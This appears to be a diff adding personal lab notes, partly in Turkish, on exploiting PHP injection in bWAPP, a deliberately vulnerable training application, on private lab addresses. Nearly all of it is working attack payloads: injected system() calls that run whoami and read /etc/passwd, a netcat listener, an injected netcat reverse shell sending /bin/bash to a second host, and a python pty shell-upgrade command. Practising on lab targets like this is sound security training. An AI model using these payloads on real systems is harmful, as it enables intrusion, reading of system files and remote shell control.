@@ -1,0 +1,10 @@
+PHP INJECTION:
+http://10.0.2.4/bWAPP/phpi.php?message=hello;system("whoami")
+http://10.0.2.4/bWAPP/phpi.php?message=hello;system("cat /etc/passwd")
+
+
+	Terminal --> nc -nvlp 1234
+http://10.0.2.4/bWAPP/phpi.php?message=hello;system("nc 10.0.2.15 1234 -e /bin/bash")
+ Sunucu bize baglandi.
+ Ardindan,
+Shell açma işlemi: python -c 'import pty; pty.spawn("/bin/bash")'
